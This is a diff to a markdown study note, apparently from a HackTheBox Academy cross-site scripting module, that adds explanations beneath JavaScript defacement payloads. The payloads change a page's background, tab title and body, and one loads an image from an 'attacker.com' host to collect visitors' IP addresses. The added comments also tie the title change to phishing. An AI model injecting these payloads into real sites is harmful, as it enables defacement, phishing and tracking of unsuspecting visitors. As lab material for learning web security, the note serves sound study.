@@ -34,6 +34,7 @@ Four DOM properties cover ~95% of defacement attacks:
 ```html
 <script>document.body.style.background = "#141d2b"</script>
 ```
+> Sets the page background color using JavaScript. Works with hex values, color names, or `rgb()` notation. Inject via stored XSS to affect all visitors.
 
 Use hex (`#141d2b`), named color (`"black"`), or rgb (`"rgb(20,29,43)"`).
 
@@ -44,8 +45,7 @@ Use hex (`#141d2b`), named color (`"black"`), or rgb (`"rgb(20,29,43)"`).
 ```html
 <script>document.body.background = "https://attacker.com/image.png"</script>
 ```
-
-> External assets leak the victim's IP to the attacker's server — useful side channel even without full XSS payload.
+> Sets the page background image to a URL you control. Replace with your own server URL. External assets leak the victim's IP to your server — useful side channel even without a full XSS payload.
 
 ---
 
@@ -54,8 +54,9 @@ Use hex (`#141d2b`), named color (`"black"`), or rgb (`"rgb(20,29,43)"`).
 ```html
 <script>document.title = 'HackTheBox Academy'</script>
 ```
+> Changes the browser tab title. Useful for phishing: make the tab look like a legitimate login page before injecting a fake form.
 
-Changes the browser tab. Useful for phishing prep — make the tab look like a legit login page.
+Changes the browser tab. Useful for phishing prep.
 
 ---
 
@@ -65,18 +66,19 @@ Changes the browser tab. Useful for phishing prep — make the tab look like a l
 ```javascript
 document.getElementById("todo").innerHTML = "New Text"
 ```
+> Finds the element with id `todo` and replaces its content. Swap `todo` for the actual element ID on your target.
 
 ### Change with jQuery (if loaded)
 ```javascript
 $("#todo").html('New Text');
 ```
+> jQuery shorthand for the same operation. Only works if the page loads jQuery. Check by typing `typeof $` in the browser console.
 
 ### Replace entire body
 ```javascript
 document.getElementsByTagName('body')[0].innerHTML = "New Text"
 ```
-
-> `getElementsByTagName` returns a collection — `[0]` selects the first match.
+> Replaces the entire page body. `getElementsByTagName` returns a collection; `[0]` selects the first (and only) body element.
 
 ---
 
@@ -93,6 +95,7 @@ document.getElementsByTagName('body')[0].innerHTML =
   '</center>';
 </script>
 ```
+> Combines background color, title, and body replacement in one payload. Build and test this locally in an HTML file first. Then minify it to a single line before injecting.
 
 ### Workflow before deploying
 
@@ -120,6 +123,7 @@ Your `<script>` executes when the parser reaches it. If you inject mid-page, lat
   ```html
   <script>window.onload = function() { document.body.innerHTML = "..." }</script>
   ```
+> Wraps the defacement in a `window.onload` handler. The change fires after the page fully loads, so later-rendering elements cannot overwrite it.
 
 ---
 
